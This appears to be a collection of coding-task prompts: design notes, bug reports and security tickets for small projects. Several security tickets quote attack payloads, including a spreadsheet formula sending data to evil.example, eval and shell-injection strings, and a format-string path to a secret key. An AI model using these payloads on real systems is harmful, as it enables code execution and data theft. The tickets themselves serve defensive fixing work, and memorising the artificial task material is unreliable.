# Design note: Run metrics and Batched runs
Status: approved | Owner: Ines

## Run metrics
Motivation:
When the output looks short nobody can tell which stage ate the records.

Behaviour:
1. After a run, `pipeline.metrics` is a list with one dict per stage, in stage order: `{"stage": name, "in": n, "out": m}` where `n` is the number of records that entered the stage and `m` the number that left it. It is `[]` for a pipeline that has not run and is replaced at the start of every run.
2. The counts describe the whole run, so they are complete after a successful `run`.

## Batched runs
Motivation:
Large inputs have to be processed in chunks and handed on chunk by chunk.

Behaviour:
1. `pipeline.run_batches(records, size, **options)` returns a generator that reads `records` (any iterable, consumed lazily) in consecutive chunks of `size` records (the last may be smaller) and yields, for each chunk, the list of records that came out of the pipeline for that chunk. Each batch is a list, even an empty one. An empty input yields nothing.
2. `size` must be a positive integer (`ValueError` otherwise, raised by the call itself, not by the first iteration). The options are those of `run`; invalid options also raise at the call.
3. Everything that is state of a *run* belongs to the whole `run_batches` call, not to one chunk: it starts once when the call is made and carries on across chunks.
4. A `dedupe` stage remembers across the chunks of one `run_batches` call and forgets when the next call (or `run`) starts.
5. `pipeline.metrics` counts the whole call (all chunks together), starting from zero when the call is made.

## Out of scope
Anything not described above; everything that works today keeps working as it does. Keep the existing tests passing.

# Design note: Drop empty records, Required fields and Error handling modes
Status: approved | Owner: Marta

## Drop empty records
Motivation:
Exports contain rows with missing values; we want a one-line way to filter them out.

Behaviour:
1. `stages.drop_empty(fields=None)` returns a predicate for `Pipeline.filter`: a record is kept when every field in `fields` has a real value. `None`, the empty string and strings that contain only whitespace count as empty, and so does a field that is missing from the record. With `fields=None` every field of the record is checked.
2. Example: `pipeline.filter(stages.drop_empty(["name"]))`.
3. `drop_empty` is available as a spec op with the optional argument `fields` (it adds a `filter` stage).

## Required fields
Motivation:
We want records with missing mandatory fields to be flagged at the stage where they enter.

Behaviour:
1. `stages.require(fields)` returns a function for `Pipeline.map` that returns the record unchanged when every listed field is present and not `None`, and otherwise raises `ValueError("missing field: NAME")` for the first listed field that is missing (an empty string is a valid value).
2. Inside a pipeline such a failure is reported like any stage failure: `StageError` with the `ValueError` as cause.
3. `require` is available as a spec op with `fields`.

## Error handling modes
Motivation:
We want to finish the run and get a list of the rows that failed.

Behaviour:
1. `run(records, on_error="raise")` gets an `on_error` option: `"raise"` (the default, today's behaviour), `"skip"` or `"collect"`; any other value is a `ValueError` raised before any record is processed.
2. In `skip` and `collect` mode a record whose stage function raises is dropped (the stage's input record, unchanged) and processing continues with the next record. With `collect` it is also appended to `pipeline.rejected` as a tuple `(stage_name, record, message)` with `message = str(exception)`.
3. `pipeline.rejected` is `[]` for a new pipeline and is reset at the start of every run; in `raise` and `skip` mode it stays empty.
4. With `on_error="collect"` the rejected records of all chunks accumulate in `pipeline.rejected`; it is reset when the call is made.
5. With the error modes every metrics entry also has `"errors"`: how many records that stage rejected in the run (0 when none; in `raise` mode the run stops at the first failure, so counts are only guaranteed for `skip` and `collect`). A rejected record counts in `in` but not in `out`.

## Out of scope
Anything not described above; everything that works today keeps working as it does. Please update the README as well.

# Design note: Dotted paths
Status: approved | Owner: Marta

### Motivation
Tags should be able to reach into nested data.

### Behaviour
1. A name can be a dotted path such as `customer.address.city` or `items.0.sku`: the parts are separated by single dots, the first part is a name as before and the others are names or whole numbers (`[A-Za-z_][A-Za-z0-9_]*` or digits); anything else (`a..b`, `.a`, `a.`, `a.-1`, `1.a`) is a `TemplateError` at parse time. The value is found by walking the data: a dict part is looked up as a key, a number part indexes a list or tuple. When a part is missing, out of range or the value along the way is anything else (`None`, a string, a number), the whole path is missing: `MissingValue` with the full path as `name`. A key that itself contains a dot is not found by its name; paths always walk.

# Design note: Reservations
Status: approved | Owner: Sunniva

### Motivation
We need a way to set packets aside for a named person without removing them from the catalogue.

### Behaviour
1. `Catalog.reserve(pid, who, n)` holds `n` units of a packet for `who`. `n` must be positive and at most the packet's `available` units, else `ValueError`; an unknown packet is a `KeyError`. Reserving again for the same person adds to their hold.
2. `Catalog.available(pid)` is `qty` minus all held units; `Catalog.reserved(pid)` returns a copy of the holds as `{who: units}` (empty dict when there are none); `Catalog.release(pid, who)` drops that person's hold and returns the number of units it held (0 if none). All three raise `KeyError` for an unknown packet.
3. `Catalog.take(pid, n, who=None)` (the old two-argument call still works): without `who` it may only hand out `available` units; with `who` it may hand out the person's own held units plus the available ones, and uses up their hold first. A take that breaks these limits is a `ValueError` and changes nothing. Holds that are used up disappear from `reserved`.
4. Removing a packet drops its holds. Holds are saved by `to_dict()` under the key `holds` as `{packet id: {who: units}}` (only packets that have holds) and restored by `from_dict`.
5. Command line: `seedswap reserve ID WHO N` prints `reserved N of ID for WHO`; `seedswap release ID WHO` prints `released N of ID from WHO` (N may be 0); `seedswap take ID N --who WHO` takes against a hold. Both new commands save the catalogue.

### Example
```
$ seedswap reserve tom-01 ana 4
reserved 4 of tom-01 for ana
$ seedswap take tom-01 8     # only 6 available
seedswap: cannot take 8 from tom-01 (have 10, 6 available)
```

## Out of scope
Anything not described above; everything that works today keeps working as it does. Match the style of the surrounding code.

# Design note: Change log
Status: approved | Owner: Amara

### Motivation
When the shelf count and the catalogue disagree, nobody can tell who took what.

### Behaviour
1. Every successful `Catalog.add`, `remove` and `take` appends an entry to the catalogue's change log. A call that raises an error appends nothing. An entry is a dict with `seq` (1 for the first entry, then 1 more each time), `op` (`add`, `remove` or `take`), `id` (the packet id) and `delta` (the change in units: `+qty` for add, minus the removed packet's `qty` for remove, `-n` for take).
2. `Catalog.ledger(pid=None)` returns copies of the entries, oldest first; with `pid` only that packet's entries.
3. The log is stored in `to_dict()` under the key `audit` and restored by `from_dict`; a dict without that key gives an empty log, and `seq` continues after a reload.
4. `seedswap ledger [ID]` prints one line per entry, `#<seq> <op> <id> <delta>`, with the delta written with an explicit sign (`+12`, `-3`). The log lives in the `--db` file, so it survives between invocations.

### Example
```
$ seedswap take tom-01 3
$ seedswap ledger tom-01
#3 add tom-01 +10
#6 take tom-01 -3
```

## Out of scope
Anything not described above; everything that works today keeps working as it does. Existing behaviour must not change for callers that do not use this.

# Design note: Clash detection and Calendar hooks
Status: approved | Owner: Tomasz

## Clash detection
Motivation:
The band was double-booked twice this summer and nobody noticed until the van was loaded.

Behaviour:
1. `add` raises the new error `Gigcal::Conflict` (a subclass of `Gigcal::Error`) when the new gig overlaps a gig on the **same date**. Two gigs overlap when each starts before the other ends: a gig that starts exactly when another ends is fine. Gigs on different dates never conflict (a gig's end is not clipped at midnight).
2. `Conflict#gig` is the existing gig it collides with (the first one in `calendar.gigs` order if there are several) and the message is `overlaps gig #ID`.
3. `add(..., force: true)` skips the check. The check runs after the argument validation and the unknown-option check, and a rejected `add` changes nothing (it does not use up an id).

## Calendar hooks
Motivation:
Other tools want to react when gigs are added or removed.

Behaviour:
1. `calendar.on(event, &block)` registers a handler and returns the block; `event` is `:added` or `:removed`, anything else (or no block) is an `ArgumentError`. `calendar.off(event, block)` removes one registration of that block (`ArgumentError` if it is not registered or the event is unknown).
2. Handlers are called synchronously, in registration order, with the gig, after the change has been made (`add` after the gig is stored, `remove` after it is gone). Registering the same block twice calls it twice. A call that raises (`ArgumentError`, `KeyError`) fires nothing.
3. With clash detection there is a third event, `:rejected`: when `add` is refused with a `Conflict`, the handlers are called with that error just before it is raised.

## Out of scope
Anything not described above; everything that works today keeps working as it does. Existing behaviour must not change for callers that do not use this.

Motivation:

Quick request for kvmem.

(Expiring keys) Some keys should disappear on their own after a while. What I need: The store has a logical clock: `store.now() -> u64` starts at 0 and `store.advance(by: u64)` moves it forward (saturating). `store.set_with_ttl(key, value, ttl: u64) -> Result<(), StoreError>` stores a value that is visible for `ttl` ticks: it is gone as soon as `now()` reaches the time of the call plus `ttl`. A bad key is `StoreError::BadKey` (checked first); `ttl` 0 is `StoreError::BadTtl`; otherwise the errors of `set` apply. An expired key behaves as if it did not exist: `get`, `len`, `keys` and `delete` (which returns false) ignore it. Plain `set` stores a key without an expiry, replacing any earlier deadline. `store.ttl(key) -> Option<u64>` returns the remaining ticks of a live key that has a deadline and `None` otherwise. `store.persist(key) -> bool` removes the deadline of a live key and says whether there was one. `Display` of `BadTtl` reads `ttl must be at least 1`. `incr` keeps the expiry of a key that is still alive (the value changes, the deadline does not); a key that has expired counts as missing, so the counter restarts from 0 without an expiry. `set_with_ttl` queues one set event. Expiry and `persist` queue nothing.

(Transactions) Updating a user and its index key takes two calls, and a crash in between leaves the store inconsistent. What I need: `store.transaction(f) -> Result<T, E>` runs the closure `f: FnOnce(&mut Store) -> Result<T, E>` (generic over `T` and `E`) with the store itself. If the closure returns `Ok`, all its changes stay and its value is returned. If it returns `Err`, every change made to keys, values and expiry deadlines during the closure is undone, and the error is returned. Transactions may be nested: an inner `transaction` that fails is undone on its own, and the outer one decides about the rest. Only the data is rolled back. Any other state keeps what the closure did, for example the logical clock moved by `advance` and subscriptions created or removed inside the closure. Deadlines set or cleared inside a rolled-back transaction are restored too; the clock itself is not rolled back, so a key whose restored deadline has passed in the meantime is simply expired. # Design note: Undo and redo
Status: approved | Owner: Ines

### Motivation
A mistyped entry or a wrong delete should not need manual repair in the data file.

### Behaviour
1. `ledger.undo() -> Result<(), LedgerError>` reverts the most recent successful `log` or `remove`: the entries and the id counter go back to exactly what they were before that call (so the next `log` hands out the id again). `ledger.redo()` re-applies the most recently undone change. `ledger.can_undo()` and `ledger.can_redo()` tell whether they would succeed.
2. Only successful calls of `log` and `remove` count as changes (failed ones leave the history alone). A new change clears everything that could be redone. Undo and redo are not changes themselves. Settings that are not entries (for example a rounding step) are not part of the history.
3. With nothing to undo, `undo` returns the new error `LedgerError::NothingToUndo`; with nothing to redo, `redo` returns `LedgerError::NothingToRedo`. `Display` reads `nothing to undo` / `nothing to redo`.
4. Several steps can be undone in a row, back to the empty ledger, and redone again.

## Out of scope
Anything not described above; everything that works today keeps working as it does. Match the style of the surrounding code.

# Design note: Line prefix, Paragraphs and Display widths
Status: approved | Owner: Noor

## Line prefix
Behaviour:
1. `wrapper.prefix(p) -> Result<Wrapper, WrapError>` puts the text `p` at the start of every output line, in front of any indentation. The prefix counts towards the width like an indent does. A prefix that is as wide as the width or wider (in characters) is the new error `WrapError::PrefixTooWide { prefix, width }` (both numbers in characters; `Display`: `prefix of N columns does not fit into width W`). The default prefix is empty.
2. The prefix comes first, then the indentation spaces, then the words; both count towards the width.

## Paragraphs
Behaviour:
1. `wrap` now treats the input as paragraphs. A line that is empty or holds only white space ends the current paragraph (several blank lines count as one, blank lines at the start and the end of the text are ignored); the other lines of a paragraph are joined as before (`\r\n` line ends are fine). Every paragraph is wrapped on its own, and between two paragraphs the output has one empty string. Text with a single paragraph gives the same output as before.
2. Every paragraph keeps its own last line unjustified.
3. The empty line between two paragraphs carries the prefix with its trailing white space removed (so `> ` gives `>`).

## Display widths
Behaviour:
1. All widths (the wrapper width, the lengths of words and lines, indents, prefixes and the padding of justified lines) are measured in terminal columns instead of characters. The width of a character is 0 for U+0300 to U+036F (combining marks), 2 for the code points in U+1100-U+115F, U+2E80-U+A4CF, U+AC00-U+D7A3, U+F900-U+FAFF, U+FE30-U+FE6F, U+FF00-U+FF60 and U+FFE0-U+FFE6, and 1 for everything else. Ordinary text is unaffected.
2. The measure is public as `wrapkit::display_width(&str) -> usize` (in the new file `src/width.rs`).
3. A prefix is measured in columns as well (`WrapError::PrefixTooWide` reports columns).

## Out of scope
Anything not described above; everything that works today keeps working as it does. Match the style of the surrounding code.
The request for the next change to wrapkit is written up in `docs/requests/paragraphs.md`. Please implement it as described there. Match the style of the surrounding code.

The cost of a break set is the sum, over all lines except the last one of the paragraph, of `(available - line width)^2`, where the line width counts the words and one space between neighbours and `available` is the width left for words on that line (a line that is a single word wider than `available` costs 0, and a line may only hold more than one word if it fits). The break set with the smallest cost wins; among equal costs the one that puts more words on the earlier lines (comparing line by line from the first) wins. Word widths, indentation and prefixes work as without `balance`; justification (if enabled) works on the balanced lines. Long words are not cut. The first line of a paragraph is balanced with its own available width.

The deploy wrapper treats exit status 1 as 'the backup failed, retry later' and 2 as 'configuration error, page someone'. When the source directory is wrong, `backupctl create` exits with 1, so the nightly job retries forever instead of paging.
`backupctl frobnicate` prints the usage text and then exits 0, so typos in our cron lines look like successful runs.

Snapshots made by our nightly job on the Mumbai servers carry the wrong time in their names (5 and a half hours ahead of the other servers), so `prune --keep-daily` also counts days differently than in the other regions. Stamps are supposed to be UTC.

Running the backup twice within the same second (our wrapper retries quickly on a flaky mount) replaced the first snapshot with a second one that had a different content. A snapshot must never be overwritten.
Restores from our snapshots are missing `.env` and `.gitignore`: dot files are not in the archive.
`backupctl list` shows the oldest snapshot first; on a directory with hundreds of snapshots the one you want is at the bottom.
`backupctl prune /backup --keep-last 3 -n` printed 'would delete ...' lines and then really deleted the snapshots. A dry run must change nothing.
After `prune` the backup directory is full of `.manifest` files whose `.tar` is gone.
A restore into a folder that already holds production files unpacked over them. The README says a target that is not empty is refused.

Backing up a folder with a file called `Q3 report final.xlsx` fails with `backupctl: cannot read /srv/finance/Q3` (the name is cut at the first space) and the snapshot is not created. Folders without such names work.

`--exclude '*.tmp'` works but `--exclude cache` does not exclude our `cache` directories (there is one in every project folder), and the archives are huge. The option takes a pattern for the base name of files and directories.

When the disk filled up during a backup, `create` failed as it should, but the destination was left with a truncated `.tar` and a half-written `.manifest` with a perfectly valid-looking name, and the next `prune` counted them as good snapshots.
`backupctl create /srv/app /backup --exclude '*.tmp' --exclude cache` ends with a usage error (`create` seems to see the patterns as extra directories). Without `--exclude` it works.
`prune --keep-last 1 --keep-daily 3` keeps three snapshots even when they are all from the same day; the README says three *days*.

Our retention config says `--keep-last 08` (months are zero padded in the config generator) and `backupctl prune` dies with `value too great for base (error token is "08")`. The README says those are decimal numbers.
`prune --keep-last 2` on a directory with `docs` and `photos` snapshots deletes all of the `photos` snapshots as soon as `docs` has two or more. Each name is supposed to be pruned on its own.
`verify` says `ok` for an archive in which somebody had slipped an extra file (not in the manifest). The README lists `EXTRA` for that case.
`backupctl verify` prints `CHANGED ...` lines but exits 0, so our post-backup check in the pipeline never fails.

Pruning a backup directory that holds `my-docs-...` and `my-photos-...` snapshots keeps one snapshot in total instead of one per name, and `list` does not show them in time order either. Names without a dash behave.

When a destination folder cannot be created (there is a regular file called `txt` where the `txt` folder should be) the tool prints a pile of `mv` errors, reports `moved N files` as if all went well, and returns 0, so our cron job never alerts. `count_lines` says 2 for a three-line file that has no trailing newline, so our "3 changes" banner is off by one for those files.

`bump_patch 1.2.09` prints `value too great for base (error token is "09")` and our release job fails on every patch number that starts with a 0 and contains an 8 or a 9; `bump_patch 1.2.07` works. Numbers are decimal.
The release script thinks 1.9.3 is newer than 1.10.0 and refuses to publish 1.10.0 (it also says 100 is older than 99). Versions must be compared number by number, not as text.

Log lines containing a percent sign are mangled: `log_line '100% done'` prints `100 0one` instead of `100% done`, messages with `%s` or `%d` print blanks or zeros, and a literal `\n` in a message turns into a real newline. The message must be printed exactly as given.
The changelog preview eats backslashes and leading spaces: a line like `  indented\path` is printed as `indentedpath`. `read_lines` must print the lines exactly as they are in the file.
The last line of a notes file is missing from the preview when the file does not end with a newline (editors on some systems do not add one). `read_lines` must include it.

`run_logged` writes "failed (1)" to the log for a failing command, but returns 0 to its caller, so `set -e` scripts and `||` handlers never notice the failure. It must return the command's own exit status.
Large orders are cheaper than the price list says: a line of 30 books is discounted by 25 %, while the price list promises 15 % from 25 pieces (and 10 % from 10), not both.
A customer who ordered exactly 10 pens got no volume discount; the price list says 'from 10 pieces'. The same happens at exactly 25.
SAVE10 took 74.00 off a big furniture order. The coupon terms say it is 10 % with a maximum of 25.00.
Coupon FIVE on a very small cart (two clips, 2.04) leaves a negative goods amount on the invoice. A coupon never takes off more than the goods are worth.
A parcel of exactly 500 g (25 pens) is charged 7.90; the tariff says up to and including 500 g costs 4.90. Same at 2000 g and 10000 g.
The quantity box of the web form posts text. Adding 2 pens and then 3 more gives 23 pens in the cart (and the line is priced as 23 pens). The README says form text is converted to a number.
Receipts show a discount of -1.50 as -2.50 and one of -0.50 as -1.50: the discount rows are off by a euro, positive amounts are right.

SAVE10 is calculated on the prices *before* volume discounts: a customer with 20 pens (30.00 list, 27.00 after the volume tier) still gets the coupon, although its minimum of 30.00 and its 10 % both refer to the amount after volume discounts.
On some coupon orders the line amounts after the coupon (`netCents`) add up to a cent or two less than `subtotalCents - volumeOffCents - couponOffCents`. Finance cannot reconcile those invoices.
Two lines of 1.02 each show 0.20 + 0.20 of 20 % tax on the invoice. Our tax rule is to round once per tax class on the sum of the amounts (2.04 gives 0.41).
Orders where a coupon brings the goods below 100.00 still ship for free, because the list price was above 100.00. Free shipping is for orders whose goods cost at least 100.00 after all discounts.
A customer who ordered a single book (reduced rate) was charged 0.25 tax on the shipping instead of 0.98. The shipping seems to be taxed like the first item.

After the checkout preview, the items on the cart page are reordered alphabetically: we add `tea`, `pen` and `book` and afterwards see book, pen, tea. Looking at the module that builds the preview I do not see it assign to the cart. The cart must not be changed by pricing.

Finance report on coupon orders, two findings. (1) SAVE10 is applied to the price before volume discounts, so both its minimum and its 10 % are computed on the wrong amount. (2) After the coupon the line amounts do not add up to the goods total (a cent or two missing). Please fix both.

Our accountant compared 40 invoices with her own spreadsheet and found cent differences in three of them. All of them are in the tax lines or the totals: one order had several lines in the same tax class, one used a coupon, and one contained only reduced-rate items. We set `APP_WORKERS=3` in the container to scale a service, but the value from `/etc/svc.json` (2) wins. The docs and the 12-factor guidance both say the environment beats the config file. Command-line flags do beat both, as expected.
`APP_DEBUG=false` leaves debug switched on. Others are right: `APP_DEBUG=0` also stays on. I printed what the coercion gives for the text "false": True. It must understand false/no/off/0.

There is no way to turn a feature off or set a number to zero from the environment or the file when the default is something else: `APP_WORKERS=0` and `"debug": false` in the JSON file are both ignored and the default stays. `None` is meant to be 'not given', but 0, False and empty strings are real values.
The `tags` setting grows: with default `["a", "b"]` and a config file that says `"tags": ["c"]` we get `a b c`. Overriding a list must replace it.

Heisenbug in the settings loader: the second request in a process sometimes sees the previous request's overrides. In the unit test I could reproduce it by loading twice with the same defaults dict: the defaults themselves had been changed by the first load. I did not find where.

Two things in the settings loader: environment variables for nested options (`APP_DB__HOST`) are silently ignored, and values from one `load()` call leak into later calls in the same process. The existing tests pass; they only use top-level lower-case names and a single load.

`pick(config, 'retry.count', 3)` returns 3 when the config says `retry.count: 0`, and `pick(config, 'cache.enabled', true)` returns true when the config explicitly disables the cache. The fallback is for missing values only.

Overriding a list option with a shorter list keeps the tail of the old one: base `hosts: ['a','b','c']` with an override `hosts: ['x']` gives `['x','b','c']`. An array in a later layer should replace the whole array.

Options passed as `{ verbose: undefined }` (from optional CLI flags that were not given) wipe out the default: the merged config has `verbose: undefined`. `undefined` is supposed to mean 'not given', whereas `null`, `0`, `false` and `''` are real values.

Security scan finding: loading a user-supplied JSON file through `mergeConfig` can set properties on `Object.prototype` (`{"__proto__": {"isAdmin": true}}` makes every object `isAdmin`). The README says those keys are ignored at every level. Please fix it; the visible tests do not cover it.
Overriding one nested option wipes its siblings: base `{db: {host: h, port: 1}}` plus override `{db: {port: 2}}` gives `{db: {port: 2}}`, the host is gone. Nested hashes are supposed to merge.

A typo in an environment variable (`WORKERS=12abc`) silently becomes 12, and `WORKERS=` (empty) becomes 0 and starts zero workers. Integer parsing should be strict and raise `ArgumentError` for anything that is not a decimal integer.
`Cfg.fetch(config, 'cache.enabled', true)` returns true although the config says `cache.enabled: false`; likewise a configured `0` comes back as the default. Defaults are for missing keys only.

The delivery estimate counts one working day too many: from Monday to the next Monday we say 6 working days, but it is 5. The end date is the day of arrival, which is not counted (ranges are half-open, as everywhere else in the calendar kit).

```

Subscriptions that start at the end of a month drift: a customer who started on 31 January is billed on the 29th of February (fine) and then on the 29th of March, April, May... instead of going back to the 31st. Each renewal date must be computed from the original start date.

The weekly report is labelled `2024-W01` for 30 December 2024, which is a week we already used in January 2024. The week label must use the ISO year that goes with the week number (that day is in `2025-W01`).

Business-day counts come out too low in months with holidays that fall on a weekend or outside the period: every date in the holiday list is subtracted, even a Saturday, even a date in another year. Only weekday holidays inside the range should reduce the count (and a date listed twice counts once).
The age check crashes for customers born on 29 February whenever the check date is in a common year (`ValueError: day is out of range for month`). They should turn a year older on 1 March.
Revenue for the last month of every quarter (March, June, September, December) is reported in the next quarter. Other months are right.
February never has 29 days in our scheduling library, so appointments on 29 February are rejected as invalid, while the standard library accepts them. `DaysIn` should handle leap years.
Adding a month to 31 January gives 3 March (2 March in a leap year) in our billing dates: the day overflows into the next month instead of stopping at the end of February.

"Days since last visit" says 0 for a customer who visited at 11 pm and came back at 1 am the next day, and the nightly report counts one day too few whenever the times of day are not equal. Calendar days, not 24-hour blocks.
Weekly statistics for Sundays land in the *next* week: with weeks starting on Monday, Sunday 9 March is attributed to the week starting Monday 10 March (in the future) instead of 3 March.

`strip_brackets("a [b] c [d]")` returns "a " instead of "a  c ": everything between the first `[` and the last `]` is removed. Each bracketed segment is meant to be removed on its own.

Our 09:00 "daily digest" reminder goes out an hour off on the first run after the clocks change in a customer's zone (10:00 or 08:00 their time), and is right again from the day after. It uses `next_daily` in `pingdesk/schedule.py`. I have not been able to reproduce it outside the days around 1 April and 1 October.

ticket PD-88: "same time next week" reminders drift by one hour when the week contains a clock change. Example: a reminder set for 09:00 local on 31 March (Kestrel zone) and moved forward one day lands at 10:00 local on 1 April instead of 09:00. Please make `add_local_days` keep the wall-clock time as documented.

The usage report counts "days since last login" wrongly for evening/morning pairs: a customer who logged in at 23:00 local and came back at 01:00 the next local day is reported as 0 days apart. Here is what I get for the Kestrel zone: `days_between(K, 2025-06-10 17:00 UTC, 2025-06-10 19:00 UTC)` -> 0. It should count calendar days in the customer's zone.

Audit finding: on the night clocks go back, reminders scheduled for a time that occurs twice (02:30 on 1 October in Kestrel) fire on the *second* pass of 02:30, an hour late, although the docs say a repeated time means its first occurrence unless asked otherwise. The reminder code just calls the zone helper, so I suspect the helper. Please fix what is wrong, keeping the documented `fold` argument working.

This looks like a scheduler bug but I cannot find it in the scheduler. `next_daily(K, 2025-09-30 12:00 UTC, 2, 30)` should be the first time 02:30 shows on the wall clocks on 1 October, 20:30 UTC, but we get 21:30 UTC, an hour later; times in the repeated hour on that day also convert to the wrong instant in the audit export. I assumed `next_daily`'s loop is at fault, but nothing in there looks wrong. Find out where the hour goes.

The nightly rollup that sums usage per local day cuts the day at the wrong instant on the day clocks change, but only for events after the change: for an event at 06:00 UTC on 1 April in Kestrel the day start comes out an hour before local midnight. Other days are fine. `local_midnight` in `schedule.py` is the place to look.

Payroll complaint from the night crew: on the night the clocks went forward they were paid for a full eight hours although the shift lasted seven. For `worked_minutes(K, 2025-03-31 22:00, 2025-04-01 06:00)` (Kestrel zone) we get 480 minutes. It should be the minutes that really elapsed.

Overtime looks too generous. Somebody who works 8 h 30 min at 12.00 an hour gets 15300 cents; only the 30 minutes past the eighth hour should be paid at the higher rate. Please check the pay rule against the README.

HR says shifts that straddle the daylight-saving changes in Tarn (southern zone, UTC+10 with a 30 minute change) are paid as if nothing happened: the night of 30 September/1 October counts as a full 8 hours instead of 7.5. The northern zone Kestrel is fine. Please find out why Tarn is different.

The roster printout shows when each shift ends in local time. For shifts that run across a clock change the end time is an hour off (a 480 minute shift starting 22:00 on 31 March in Kestrel shows 06:00 instead of 07:00 the next morning). `shift_end_local` is the function behind that printout.

Payroll for Tarn (southern zone, 30 minute change) is off by 30 minutes for some shifts around the changes and right for others. Kestrel looks fine in the same run, but when I tried a shift that ends during the repeated hour in Kestrel it was paid short too. I could not tell whether that is the same problem. The visible tests all pass. Please work out every cause.

LoginGuard.allowed is unsafe: `LoginGuard` is wired into the login handler but `allowed` always answers True and `record` only appends timestamps forever: there is no limit on password guesses per account, so credential stuffing and brute force run unthrottled. fix it without breaking normal use, README.md says what normal is.

read_body is unsafe: `read_body` calls `stream.read()` without a limit and `parse_rows` accepts any number of rows and fields of any length: one request with a multi-gigabyte body (or a 100 MB single field) exhausts the memory of the worker and takes the service down. fix it without breaking normal use, README.md says what normal is.

Review comment on `RateLimiter.client_ip`: `client_ip` trusts the left-most entry of `X-Forwarded-For` from any caller, so a client sends a different forged address in the header with every request and is never rate limited; it can also frame another address by sending it as theirs. Please fix this properly and keep the existing functionality, including unusual but valid inputs. Nobody should be able to work around the fix with a variant of the payload.

A penetration test of the step-up authentication reported a vulnerability: `verify` has no attempt counter and codes can be requested without limit: a six-digit code falls to brute force in a few hundred thousand guesses (or far fewer, because every new code resets the search), and a correct code can be replayed until it expires. Fix it in the code so the whole class of problem is gone (not just the payload from the report) and keep everything legitimate working. README.md describes the intended behaviour.

We had an incident review for the billing portal. Root cause: `get_invoice` and `list_invoices` never look at who is asking: changing the id in `/invoices/17` to `/invoices/18` shows another customer's invoice, and the list page shows everybody's invoices (insecure direct object reference). Close the hole in `Billing.get_invoice` and anything that shares the flaw in this repository; normal users must notice nothing.

Our static analysis flagged `Docs.update` (CWE-863): Only `read` checks permissions: `update`, `share` and `delete` accept any logged-in user, so a reader can overwrite or delete a document they were only meant to view, and any user can grant themselves (or others) access to somebody else's document by calling `share`. Harden the code. Existing behaviour for legitimate callers has to stay exactly as documented in README.md; there are tests for both the normal use and for hostile input.

Review comment on `Directory.set_role`: `set_role` and `delete_user` can be called by any logged-in user: a normal user promotes themselves with `set_role(me, me, "admin")` or deletes the administrators (missing function-level authorization). Please fix this properly and keep the existing functionality, including unusual but valid inputs. Nobody should be able to work around the fix with a variant of the payload.

Workspace.invite is unsafe: `invite` accepts any role from any caller: a viewer (or a stranger) can invite their own second account as `admin` or `owner`, which is a privilege escalation path through a feature that was meant to be harmless. fix it without breaking normal use, README.md says what normal is.

Our static analysis flagged `Helpdesk.search` (CWE-639): Only `get` checks the tenant: `search` returns matching tickets of *all* tenants (titles, bodies and comments of other customers), and `comment` lets a user write into another tenant's ticket just by knowing or guessing its id. Harden the code. Existing behaviour for legitimate callers has to stay exactly as documented in README.md; there are tests for both the normal use and for hostile input.

Our static analysis flagged `Notes.delete_many` (CWE-639): `delete_many` only requires that *some* id in the list belongs to the caller (`any`): a request listing one of your own notes plus fifty ids of other users deletes all of them; unknown ids are skipped silently. Harden the code. Existing behaviour for legitimate callers has to stay exactly as documented in README.md; there are tests for both the normal use and for hostile input.

A penetration test of the project tracker API reported a vulnerability: `/orgs/<org>/projects/<id>` checks that the caller belongs to `<org>`, but then loads the project by id alone: a member of any organisation can read (or, as admin of their own org, delete) projects of other organisations by pairing their own org id with a foreign project id. Fix it in the code so the whole class of problem is gone (not just the payload from the report) and keep everything legitimate working. README.md describes the intended behaviour.

Acl.can_read is unsafe: `can_read` caches every decision in `_cache`, and none of the functions that change memberships or document ownership clears it: a user removed from a team (or whose team was deleted, or whose document moved to another team) can keep reading for as long as the process lives, and new members are denied until restart. fix it without breaking normal use, README.md says what normal is.

Close the hole in `map_put` and anything that shares the flaw in this repository; normal users must notice nothing.

We had an incident review for the orders report export. Root cause: `export_csv` writes customer-supplied text (names, notes) straight into the CSV: a customer whose name is `=HYPERLINK("http://evil.example/?"&A2,"click")` or `=cmd|' /C calc'!A0` gets a formula executed on the accountant's machine when the report is opened in a spreadsheet (CSV / formula injection). Close the hole in `export_csv` and anything that shares the flaw in this repository; normal users must notice nothing.

Review comment on `calculate`: `calculate` passes what the user typed to `eval`: `__import__('os').system(...)`, `open('/etc/passwd').read()` or any other Python expression runs on the server with the application's privileges, and `9**9**9` hangs it. Please fix this properly and keep the existing functionality, including unusual but valid inputs. Nobody should be able to work around the fix with a variant of the payload.

Review comment on `render_email`: `render_email` hands customer-written templates to `str.format` together with a `User` object: a template containing `{user.__class__.__init__.__globals__[SECRET_KEY]}` (attribute and index traversal) prints the application's signing key into the e-mail, and `{name.__class__}` style fields expose internals. Please fix this properly and keep the existing functionality, including unusual but valid inputs. Nobody should be able to work around the fix with a variant of the payload.

We had an incident review for the alert relay. Root cause: `send_alert` builds a shell command line by pasting the message in (`shell=True`), so a message like `x; echo INJECTED` or `$(echo INJECTED)` runs extra commands, and messages with quotes or `$` signs are mangled. Close the hole in `send_alert` and anything that shares the flaw in this repository; normal users must notice nothing.

Security ticket for the backup scheduler (CWE-78). Problem: `archive_command` interpolates the archive name and format into a shell command (`shell=True`); a name containing `;`, `$(...)` or a newline runs extra commands, and the format is not validated at all. Acceptance: hostile input can no longer do this, every documented behaviour still works, and the fix is in the code (not in the tests). Don't weaken the visible tests.

A penetration test of the diagnostics page reported a vulnerability: `lookup_host` passes the hostname typed into the diagnostics form to `os.popen` as part of a shell command, so `example.org; echo INJECTED` executes the second command. Fix it in the code so the whole class of problem is gone (not just the payload from the report) and keep everything legitimate working. README.md describes the intended behaviour.

Our static analysis flagged `greet` (CWE-78): `greet` wraps the user's display name in double quotes inside a shell command, which does not stop `"; echo INJECTED; "`, `$(echo INJECTED)` or a backtick expression from being executed, and names with a dollar sign are expanded. Harden the code. Existing behaviour for legitimate callers has to stay exactly as documented in README.md; there are tests for both the normal use and for hostile input.

A penetration test of the maintenance job runner reported a vulnerability: `run_job` checks that the first word of the command line is on the allow-list and then hands the *whole string* to a shell, so `echo hi; echo INJECTED` passes the check and runs a second command. Fix it in the code so the whole class of problem is gone (not just the payload from the report) and keep everything legitimate working. README.md describes the intended behaviour.

Review comment on `list_dir`: `list_dir` passes the folder name from the URL to `ls` as an argument; a folder name that starts with `-` (for example `-R` or `--help`) is read by `ls` as an option, which changes what is listed and can expose the whole tree. Please fix this properly and keep the existing functionality, including unusual but valid inputs. Nobody should be able to work around the fix with a variant of the payload.

